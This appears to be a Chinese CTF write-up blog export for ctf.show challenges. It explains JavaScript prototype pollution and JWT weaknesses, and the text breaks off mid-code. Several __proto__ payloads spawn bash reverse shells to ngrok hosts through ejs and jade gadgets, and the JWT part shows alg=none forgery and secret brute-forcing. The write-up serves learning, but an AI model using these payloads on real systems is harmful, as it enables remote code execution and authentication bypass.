title="javascript原型链继承"></a>javascript原型链继承</h3><p>所有类对象在实例化的时候会将拥有prototype中的属性和方法,这个特性被用来实现javascript中的继承机制</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">function <span class="title function_">Father</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">this</span>.first_name = <span class="string">&quot;Donald&quot;</span></span><br><span class="line"><span class="built_in">this</span>.last_name = <span class="string">&quot;Trump&quot;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">function <span class="title function_">Son</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">this</span>.first_name = <span class="string">&quot;Melania&quot;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"></span><br><span class="line"><span class="type">let</span> <span class="variable">son</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line">console.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`)</span><br></pre></td></tr></table></figure><p>Son类继承了father类的last_name属性,最后输出的是Name: Melania Trump.对于对象son,在调用son.last_name时,实际上javascript引擎会进行如下操作</p><ol><li>在对象son中寻找last_name</li><li>如果找不到,则在son.__proto__中寻找last_name</li><li>如果仍然找不到,则继续在son._<em>proto</em>_.__proto__中寻找last_name</li><li>依次寻找,直到找到null结束.比如,object.prototypt的__proto__就是null</li></ol><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413140624879.png" alt="image-20220413140624879"></p><p>javascript的这个查找的机制,被用在面向对象的继承之中,被称作prototype继承链</p><ol><li>每一个构造函数(constructor)都有一个原型对象(prototypt)</li><li>对象的__proto__属性,指向类的原型对象prototype</li><li>javascript使用prototype链实现继承机制</li></ol><h3 id="原型链污染-1"><a href="#原型链污染-1" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>foo.__proto__指向的是Foo类中的prototype.那么,如果我们修改了foo.__proto__中的值,是不是就可以修改Foo类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//foo是一个简单的javascript对象</span></span><br><span class="line"><span class="type">let</span> <span class="variable">foo</span> <span class="operator">=</span> &#123;bar:<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//foo.bar此时为1</span></span><br><span class="line">console.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改foo的原型(即object)</span></span><br><span class="line">foo.__proto__.bar = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//由于查找顺序的愿意,foo.bar依然是1</span></span><br><span class="line">console.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">//此时在用object创建一个空的zoo对象</span></span><br><span class="line"><span class="type">let</span> <span class="variable">zoo</span> <span class="operator">=</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查看zoo.bar</span></span><br><span class="line">console.log(zoo.bar)</span><br></pre></td></tr></table></figure><p>虽然zoo是一个空对象{},但是zoo.bar的结果是2</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413141325570.png" alt="image-20220413141325570"></p><p>显然我们前面修改了foo的原型foo._<em>proto</em>_.bar &#x3D; 2 ,而foo是一个object类的实例,所以实际上是修改了object这个类,给这个类增加了一个属性bar,值为2.后来我们又用object类创建了一个zoo对象let zoo &#x3D; {},zoo对象自然也有一个bar属性了.那么在一个应用中,如果攻击者控制并修改了一个对象的原型,那么将可以影响所有和这个对象来自同一个类,父类的对象,</p><h3 id="哪些情况下原型链会有污染呢"><a href="#哪些情况下原型链会有污染呢" class="headerlink" title="哪些情况下原型链会有污染呢"></a>哪些情况下原型链会有污染呢</h3><p>找找能够控制数组(对象)的”键名”操作就好</p><ul><li>对象merge</li><li>对象clone(其实内核就是将待操作对象merge到一个空对象中)</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">function <span class="title function_">merge</span><span class="params">(target,source)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(let key in source)&#123;</span><br><span class="line"><span class="keyword">if</span> (key in source &amp;&amp; key in target)&#123;</span><br><span class="line">merge(target[key],source[key])</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">target[key] = source[key]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在合并的时候,存在赋值的操作target[key] &#x3D; source[key],那么这个key如果是_<em>proto</em>_,是不是可以原型链污染呢</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">let</span> <span class="variable">o1</span> <span class="operator">=</span> &#123;&#125;</span><br><span class="line"><span class="type">let</span> <span class="variable">o2</span> <span class="operator">=</span> &#123;a: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;b:<span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1,o2)</span><br><span class="line">console.log(o1.a,o2.b)</span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br></pre></td></tr></table></figure><p>合并虽然成功了,但是原型链并没有污染</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413144531611.png" alt="image-20220413144531611"></p><p>这是因为,我们用javascript创建o2的过程(let o2 &#x3D; {a: 1,”__proto__”:{b:2}})中,__proto__已经代表了o2的原型,此时遍历o2所有的键名,拿到的是[a,b],__proto__并不是一个key,自然也不会修改object的原型</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;:1,&quot;__proto__&quot;:&#123;&quot;b&quot;:2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(o1,o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>,o2.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure><p>可见，新建的o3对象，也存在b属性，说明Object已经被污染</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413145041912.png" alt="image-20220413145041912"></p><p>这是因为,JSON解析的情况下,__proto__会被认为是一个真正的键名,而不是代表原型,所以在遍历o2的时候会存在这个键</p><p>merge操作是最常见可控键名的操作,也最能被原型链攻击,很多库都存在这个问题</p><h3 id="Code-Breaking-2018-Thejs-分析"><a href="#Code-Breaking-2018-Thejs-分析" class="headerlink" title="Code-Breaking 2018 Thejs 分析"></a>Code-Breaking 2018 Thejs 分析</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>)</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;ejs&#x27;</span>, <span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) &#123; </span><br><span class="line"><span class="comment">// define the template engine</span></span><br><span class="line">    fs.<span class="title function_">readFile</span>(filePath, <span class="function">(<span class="params">err, content</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.<span class="title function_">template</span>(content)</span><br><span class="line">        <span class="keyword">let</span> rendered = <span class="title function_">compiled</span>(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">callback</span>(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.<span class="property">session</span>.<span class="property">data</span> || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        data = lodash.<span class="title function_">merge</span>(data, req.<span class="property">body</span>)</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">data</span> = data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">language</span>: data.<span class="property">language</span>, </span><br><span class="line">        <span class="attr">category</span>: data.<span class="property">category</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>lodash是为了弥补javascript原生函数功能不足而提供的一个辅助功能集,其中包含字符串,数组 对象等操作,这个web应用中,使用了loadsh提供的两个工具</p><ol><li>lodash.template 一个简单的模板引擎</li><li>lodash.merge函数或对象的合并</li></ol><p>其实整个应用的逻辑很简单,用户提交的信息,用merge方法合并到session里,多次提交,session里最终保存你提交的所有信息.</p><p>而这里的lodash.template的代码<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Use a sourceURL for easier debugging.</span></span><br><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">&#x27;sourceURL&#x27;</span> <span class="keyword">in</span> options ? <span class="string">&#x27;//# sourceURL=&#x27;</span> + options.<span class="property">sourceURL</span> + <span class="string">&#x27;\n&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> result = <span class="title function_">attempt</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Function</span>(importsKeys, sourceURL + <span class="string">&#x27;return &#x27;</span> + source)</span><br><span class="line">  .<span class="title function_">apply</span>(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>options是一个对象,sourceurl取到了其options.sourceurl属性.这个属性本来是没有赋值的默认取空字符串</p><p>但是因为原型链污染,我们可以给所有的object对象中插入一个sourceurl属性,这个sourceurl被拼接进new Function的第二个参数中,造成任意代码执行漏洞.</p><p>我们将带有__proto__的payload以json的形式发送给后端,因为express框架支持根据content-type来解析请求的body</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413150214879.png" alt="image-20220413150214879"></p><p>回到本题,下载下来就是一堆文件,我们直接搜索flag</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413153317715.png" alt="image-20220413153317715"></p><p>这里有一个copy函数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413154519891.png" alt="image-20220413154519891"></p><p>这里的secert是没有ctfshow属性,那么我们可以利用copy方法对其进行原型链污染,即给secert的object增加一个ctfshow为36dboy</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413160253517.png" alt="image-20220413160253517"></p><h1 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h1><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p><a href="https://xz.aliyun.com/t/7184">ejs rce</a></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413160909360.png" alt="image-20220413160909360"></p><p>这里显然是不可能相等的,当然这里还是存在原型链污染</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413161012408.png" alt="image-20220413161012408"></p><p>这里存在一个api.当post方式访问&#x2F;api时，会执行后面的Function(query)(query)当post方式访问&#x2F;api时，会执行后面的Function(query)(query)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/6.tcp.ngrok.io/19625 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413161347053.png" alt="image-20220413161347053"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413161434931.png" alt="image-20220413161434931"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413162750753.png" alt="image-20220413162750753"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413172237644.png" alt="image-20220413172237644"></p><h1 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h1><h2 id="原型链污染两级反弹shell"><a href="#原型链污染两级反弹shell" class="headerlink" title="原型链污染两级反弹shell"></a>原型链污染两级反弹shell</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/0.tcp.ngrok.io/15600 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413164819178.png" alt="image-20220413164819178"></p><h1 id="web341"><a href="#web341" class="headerlink" title="web341"></a>web341</h1><p>预期解ejs rce</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/6.tcp.ngrok.io/11125 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后再随便访问一下页面就能触发rce</p><h1 id="web342"><a href="#web342" class="headerlink" title="web342"></a>web342</h1><p>jade原型链污染<a href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/6.tcp.ngrok.io/11125&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>在login页面打上去之后随便访问下，就会反弹</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT</title>
      <link href="/ctfshow/ctf.show/JWT/"/>
      <url>/ctfshow/ctf.show/JWT/</url>
      
        <content type="html"><![CDATA[<h1 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h1><h2 id="什么是jwt"><a href="#什么是jwt" class="headerlink" title="什么是jwt"></a>什么是jwt</h2><p>jwt是一个开放标准,它定义的一种紧凑的 自包含的方式,用于所谓json对象在各方之间安全的传输信息.该信息可以被验证和信任,因为它是数字签名的.</p><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><ul><li><p>一次性验证</p><p>  比如用户注册后需要发放一封邮件让其激活账户,通常邮件中只需要有一个链接,这个链接需要具备以下的特性:能够标识用户,该链接具有时效性(通常只允许几个小时内激活),不能被篡改其激活其他可能的账户..这种场景就和jwt的特性非常 的贴近,jwt的payload中固定的参数:iis签发这和exp过期时间正式为其准备的</p></li><li><p>restful api的无状态认证</p><p>  使用jwt来做restful api的身份认证也是值得推崇的一种使用方案.客户端和服务器共享secret;过期时间有服务端效验,客户端定时刷新;签名信息不可被更改,spring security oauth jwt 提供了一套完整的jwt认证体系</p></li></ul><h2 id="jwt结构"><a href="#jwt结构" class="headerlink" title="jwt结构"></a>jwt结构</h2><p>jwt由三部分构成,他们之间用远点(.)连接.这三部分分别是</p><ul><li>Header</li><li>Payload</li><li>Signature</li></ul><p>具体示例如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure><h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>jwt的头部由两部分信息组成</p><ul><li>type:声明类型,这里是jwt</li><li>alg:声明加密的算法 通常直接使用HMAC SHA256</li></ul><p>完整的头部信息如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;:&quot;jwt&quot;,</span><br><span class="line">  &quot;alg&quot;:&quot;HS256&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对头部信息进行base64编码得到第一部分信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><br></pre></td></tr></table></figure><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>载荷就是存放有效信息的地方,它包含声明要求.声明有三种类型</p><ul><li>registered claims:标准中注册的声明,这里有一组预定义的声明,他们不是强制的,但是推荐</li><li>public  claims:公共的声明</li><li>private claims:私有的声明</li></ul><p>标准中注册的声明</p><ul><li>iss: jwt签发者</li><li>sub: jwt所面向的用户</li><li>aud: 接收jwt的一方</li><li>exp: jwt的过期时间，这个过期时间必须要大于签发时间</li><li>nbf: 定义在什么时间之前，该jwt都是不可用的</li><li>iat: jwt的签发时间</li><li>jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击</li></ul><p>公共的声明:</p><p>公共的声明可以添加任何信息,一般添加用户的相关信息或者其他业务需要的必要信息,但是不建议添加敏感信息,因为该部分可以在客户端解密</p><p>私有的声明:</p><p>私有声明是提供者和消费者所共同定义的声明,一般不建议存放敏感信息,因为base64是对称解密的,意味着该部分信息可以归类为明文信息</p><p>对payload进行base64加密得到了jwt的第二部分内容</p><h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>jwt的第三部分是一个签证信息,这个签证信息由三部分组成:</p><ul><li>header(base64)</li><li>payload(base64)</li><li>secret</li></ul><p>第三部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串,然后通过header中声明的加密凡是进行加盐secret组合加密,然后就构成了jwt的第三部分</p><p>注意</p><p>secret是保存在服务器端的,jwt的签发生成也是在服务器端的,secret就是用来进行jwt的签发和jwt的验证.所以它就是你服务端的私钥,在任何场景都不应该泄露出去.一旦客户端得知增secret,那么就意味着客户端可以自我签发jwt了</p><p><a href="https://www.jianshu.com/p/4a124a10fcaf">https://www.jianshu.com/p/4a124a10fcaf</a></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281508057.png" alt="image-20220328150821999"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281508209.png" alt="image-20220328150828162"></p><p>这里提示访问admin文件夹</p><p>要注意使用 url 访问网页时<br>&#x2F;admin    表示访问 admin.php 文件<br>&#x2F;admin&#x2F;    表示访问 admin&#x2F;目录下的文件，默认是 index.php<br>很像文件夹，所以此处应该访问 &#x2F;admin&#x2F;</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281508710.png" alt="image-20220328150840662"></p><p>cookie看着像<a href="https://jwt.io/">jwt</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0A.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2NDg0NTY0OTksImV4cCI6MTY0ODQ2MzY5OSwibmJmIjoxNjQ4NDU2NDIyMjI5OSwic3ViIjoiYWRtaW4ifV0</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281510851.png" alt="image-20220328151007774"></p><p>alg加密算法为none</p><p>sub为user改为admin重新登录下试试</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281625373.png" alt="image-20220328162550323"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281725039.png" alt="image-20220328172517993"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1648459436,&quot;exp&quot;:1648466636,&quot;nbf&quot;:1648459436,&quot;sub&quot;:&quot;admin&quot;,&quot;jti&quot;:&quot;8b158096b6e36731237170f44d95d21f&quot;&#125;]</span><br></pre></td></tr></table></figure><p>合起来,很奇怪这里执行不成功</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281752414.png" alt="image-20220328175237361"></p><p>前面删了才能执行成功,感觉是不是环境的问题</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203281752207.png" alt="image-20220328175246153"></p><h1 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311626070.png" alt="image-20220331162629981"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0ODcxNTE4MywiZXhwIjoxNjQ4NzIyMzgzLCJuYmYiOjE2NDg3MTUxODMsInN1YiI6InVzZXIiLCJqdGkiOiJkM2Y3YjhiOTA3YWE1M2UyZTA3MTlmOWY0MTQ3ZmFiYSJ9.Zyy2DOiFSao6aLvThffBR4ZYCShY9wLwN2rjelgn-3o</span><br></pre></td></tr></table></figure><p>第一段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</span><br></pre></td></tr></table></figure><p>sh256加密</p><p>第二段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1648715183,&quot;exp&quot;:1648722383,&quot;nbf&quot;:1648715183,&quot;sub&quot;:&quot;user&quot;,&quot;jti&quot;:&quot;d3f7b8b907aa53e2e0719f9f4147faba&quot;&#125;</span><br></pre></td></tr></table></figure><p>前面算法保证了jwt在传输的过程中不被恶意用户修改,但是header中的alg字段可被修改为none,一些jwt库支持none算法,即使没有签名算法,当alg为none时后端不会进行签名校验,将alg修改为none之后,去掉jwt中的signature数据,只剩header.payload.(这里的.不是句号哦).然后提交到服务端即可</p><p>修改</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;None&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</span><br><span class="line">eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1648715183,&quot;exp&quot;:1648722383,&quot;nbf&quot;:1648715183,&quot;sub&quot;:&quot;admin&quot;,&quot;jti&quot;:&quot;d3f7b8b907aa53e2e0719f9f4147faba&quot;&#125;</span><br><span class="line">eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0ODcxNTE4MywiZXhwIjoxNjQ4NzIyMzgzLCJuYmYiOjE2NDg3MTUxODMsInN1YiI6ImFkbWluIiwianRpIjoiZDNmN2I4YjkwN2FhNTNlMmUwNzE5ZjlmNDE0N2ZhYmEifQ</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0ODcxNTE4MywiZXhwIjoxNjQ4NzIyMzgzLCJuYmYiOjE2NDg3MTUxODMsInN1YiI6ImFkbWluIiwianRpIjoiZDNmN2I4YjkwN2FhNTNlMmUwNzE5ZjlmNDE0N2ZhYmEifQ.</span><br></pre></td></tr></table></figure><p>记得访问&#x2F;admin&#x2F;页面哦</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311634328.png" alt="image-20220331163435158"></p><h1 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404222258525.png" alt="image-20220404222258525"></p><h2 id="c-jwt-cracker"><a href="#c-jwt-cracker" class="headerlink" title="c-jwt-cracker"></a><a href="https://www.ape-ask.com/go.html?url=aHR0cHM6Ly9naXRodWIuY29tL2JyZW5kYW4tcml1cy9jLWp3dC1jcmFja2Vy">c-jwt-cracker</a></h2><p>先安docker</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build . -t jwtcrack</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it --rm  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0OTA4MTgyOSwiZXhwIjoxNjQ5MDg5MDI5LCJuYmYiOjE2NDkwODE4MjksInN1YiI6InVzZXIiLCJqdGkiOiJkNWM2Yjg5MTBjYjMzZmZkZTVkN2NlNzRiM2E1ZTllNiJ9.4SRvUVI8lQ_yfMrKsSVcjnQvFEojGt0LvXu4gkX4amY 1234567890</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404224055707.png" alt="image-20220404224055707"></p><p>这里定义密钥为数字快一点</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404224214524.png" alt="image-20220404224214524"></p><p>改一下拿去访问&#x2F;admin&#x2F;就好</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404224205379.png" alt="image-20220404224205379"></p><h1 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it --rm  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY0OTA4MzM5OSwiZXhwIjoxNjQ5MDkwNTk5LCJuYmYiOjE2NDkwODMzOTksInN1YiI6InVzZXIiLCJqdGkiOiIwOTJlMTBhMzJlOTY2ZDY2NGM4MWMzM2QyMjlhMzY4ZSJ9.lLsYI7NGjbb4xdzmyR1YkPSgcksnBiNm4eWmVqQ2Q2U asdfghjklpoiuytrewqzxcvbnm0987654321</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404224420522.png" alt="image-20220404224420522"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404224444069.png" alt="image-20220404224444069"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404224459271.png" alt="image-20220404224459271"></p><h1 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">给了一个aap.<span class="property">js</span></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public//private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span 